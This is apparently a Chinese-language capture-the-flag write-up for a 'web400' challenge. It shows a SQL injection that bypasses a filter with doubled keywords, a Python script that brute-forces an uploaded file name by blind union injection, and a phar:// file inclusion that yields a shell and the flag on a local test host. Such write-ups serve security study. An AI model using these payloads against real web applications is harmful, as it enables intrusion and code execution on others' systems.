## web400 writeup

注册一个账号进入之后,发现download页面的收藏功能存在整数型sql注入
download的过程是用文件id到数据库中查找文件路径,然后读取文件返回.

所以可以用union联合注入,修改文件名,下载别的文件.
这里有过滤,双写可以绕过.

```
image=888%20ununionion%20selselectect%200x696e6465782e706870&image_download=%E6%94%B6%E8%97%8F
```
就可以下载index.php,然后利用次方法下载所有的文件,进行代码审计.
发现index.php 存在文件包含漏洞,但是限定了后缀必须是 .php文件

所以思路是利用php的phar协议绕过,但是却没有文件上传路径,所以需要利用注入获取文件名.
由于过滤了(),所以需要利用union盲注,来找文件名.
具体怎么union盲注,参考这里[http://wonderkun.cc/index.html/?p=547](http://wonderkun.cc/index.html/?p=547)

提供一个python的exp
```python
#!/usr/bin/python
# coding:utf-8

import requests

def getFilename():
    data="image=2%20aandnd%20image_name%20lilikeke%200x74657374%20ununionion%20selselectect%200x{filename}%20oorrder%20by%201&image_download=%E6%94%B6%E8%97%8F"
    url = "http://127.0.0.1:5555/downfile.php"
    headers = {
        "Content-Type":"application/x-www-form-urlencoded",
        "Cookie":"PHPSESSID=k6to46unk90e733r47qdqh8ll7",
        "User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36"
    }

    randStr="0123456789abcdefghijklmnopqrstuvwxyz{"
    fileName = "./Up10aDs/"
    for _ in range(33):
        print "[*]",fileName
        for i in range(len(randStr)):
            # print i
            tmpFileName = fileName+randStr[i]
            proxies = {"http":"127.0.0.1:8080"}
            res = requests.post(url,data=data.format(filename=tmpFileName.encode("hex")),headers=headers,proxies=proxies)
            # print res.text
            if "file may be deleted" not in res.text:
                fileName = fileName + randStr[i-1]
                break

if __name__ == '__main__':
    getFilename()
```

计算出filename为:[*] ./Up10aDs/y9c8v9ow3s6ans5o8oy5u3qnsdnckeva 加上后缀名为自己上传文件的后缀名,就是文件名,所以文件名是 ./Up10aDs/y9c8v9ow3s6ans5o8oy5u3qnsdnckeva.png
包含此文件就可以getshell了.
```
http://127.0.0.1:5555/index.php?file=phar://Up10aDs/y9c8v9ow3s6ans5o8oy5u3qnsdnckeva.png/1
```
在文件F1AgIsH3r3G00d.php读取到flag 
```
$flag = "flag{f1a4628ee1e9dccfdc511f0490c73397}";
```




